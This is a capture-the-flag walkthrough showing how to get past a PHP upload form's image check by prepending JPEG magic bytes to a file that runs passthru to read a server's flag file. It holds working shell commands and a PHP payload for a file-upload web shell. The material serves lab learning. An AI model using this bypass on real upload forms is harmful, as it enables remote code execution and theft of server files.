## Walkthrough
It is recommended that you work through the php_file_flag challenge before starting this challenge because they are very similar.

At first glance, this challenge looks exactly like php_file_flag. However, when attempting to upload the same sol.php file, the website gives an error that the file is not an image file. An attempt to change extension of the sol.php to .jpg also does not succeed in uploading the file. Some Googling reveals that a common way to check if a file is an image in PHP is by using the <code>exif_imagetype()</code> function. This function works by checking the first few bytes of the file (magic number) to determine if the file is an image. Some additional Googling reveals that the first bytes of a JPG file are always "FF D8 FF E0". We can make our sol.php file that starts with those bytes using these commands in Linux:

``` sh
$ echo "FF D8 FF E0" | xxd -r -p >> sol.php # xxd converts the string into hex
$ echo "<?php passthru('cat ../../flag.txt'); ?>" >> sol.php
```

This file will still correctly execute PHP because PHP files only execute code that is between the "<?" and "?>". You can upload this file in the form then right click on the broken image icon to open in a new tab, which executes the PHP and displays the flag.
